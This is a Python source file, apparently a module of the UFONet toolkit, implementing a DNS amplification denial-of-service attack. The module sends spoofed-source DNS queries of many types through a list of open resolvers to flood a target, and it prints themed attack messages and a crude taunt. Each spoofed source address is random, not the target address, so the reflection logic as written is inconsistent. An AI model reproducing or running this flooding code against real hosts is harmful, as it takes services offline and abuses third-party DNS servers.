#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

dns_file = "botnet/dns.txt" # OpenDNS servers IP list
qtype = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"] # Query types
ttl = 128 # (TTL) Time To Live 
timeout = 5 # defautl timeout
qname = "www.google.com" # default 'spoofed' query 

# UFONet DNS Amplification (TACHYON)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def dnsize(ip, port, rounds):
    n=0
    try: # (DNS) Amplification attack uses publically accessible DNS servers to flood a target with DNS response traffic
        with open(dns_file) as f: # extract OpenDNS servers from file
            dns_d = f.read().splitlines() 
        f.close()
        p_num=0
        for x in range (0,int(rounds)):
            try:
                n=n+1
                print("[Info] [AI] [TACHYON] Shooting 'crystal' ["+str(n)+"] and unloading laser on it! -> [REFLECTING!]")
                for i in qtype: # loop through all query types then all DNS servers
                    for j in dns_d:
                        p_num += 1
                        src_ip = randIP() # ip source spoofed on each packet sent
                        packet = IP(src=src_ip, dst=j, ttl=ttl) / UDP(sport=port) / DNS(rd=1, qd=DNSQR(qname=qname, qtype=i))
                        try:
                            send(packet, verbose=0) # not using sr1 because non-replies are required
                            print(("[Info] [AI] [TACHYON] Lasered 'crystal' [{}]".format(p_num))+" IS BEING REFLECTED by ["+str(j)+"] using DNS type: "+str(i)+" -> [AMPLIFYING!]")
                        except:
                            print(("[Info] [AI] [TACHYON] Lasered 'crystal' [{}]".format(p_num))+" HAS FAILED to be reflected by ["+str(j)+"] using DNS type: "+str(i)+" -> [PASSING!]")
            except:
                print("[Error] [AI] [TACHYON] Failed to engage with 'crystal' ["+str(n)+"]")
    except:
        print("[Error] [AI] [TACHYON] Failing to engage... -> Is still target online? -> [Checking!]")

class TACHYON(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] DNS Amplification (TACHYON) is ready to fire: [" , rounds, "crystals ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [TACHYON] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        dnsize(ip, port, rounds) # attack with TACHYON using threading
